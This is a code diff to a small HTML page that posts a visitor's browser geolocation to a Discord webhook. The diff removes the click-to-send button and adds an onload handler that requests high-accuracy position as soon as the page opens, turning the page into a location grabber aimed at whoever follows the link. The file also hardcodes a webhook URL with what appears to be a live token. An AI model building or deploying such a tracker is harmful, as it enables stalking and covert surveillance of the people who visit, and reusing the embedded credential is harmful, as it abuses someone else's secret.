@@ -3,26 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Maps Location Sender</title>
+    <title>Auto Send Location</title>
 </head>
 <body>
-    <h1>Send Your Location to Discord</h1>
-    <button id="sendLocation">Send Location</button>
+    <h1>Sending Location...</h1>
 
     <script>
-        document.getElementById('sendLocation').addEventListener('click', function() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendPosition, showError);
-            } else {
-                alert("Geolocation is not supported by this browser.");
-            }
-        });
-
+        // Function to send position to the Webhook
         function sendPosition(position) {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
             const webhookUrl = "https://discord.com/api/webhooks/1272943176063123621/6MwZvPOZPoKX_iupyJJ-E19Kb9gZVeYfUH0IeLL-PrYUNOeXlq4j1aJSLyKcce4kdT1C";
-            
+
             const data = {
                 content: `Current location: https://www.google.com/maps?q=${latitude},${longitude}`
             };
@@ -44,6 +36,7 @@
             });
         }
 
+        // Function to handle errors
         function showError(error) {
             switch(error.code) {
                 case error.PERMISSION_DENIED:
@@ -60,6 +53,18 @@
                     break;
             }
         }
+
+        // Automatically request the location when the page loads
+        window.onload = function() {
+            if (navigator.geolocation) {
+                // Requesting position with high accuracy for better results on iOS
+                navigator.geolocation.getCurrentPosition(sendPosition, showError, {
+                    enableHighAccuracy: true
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        };
     </script>
 </body>
 </html>
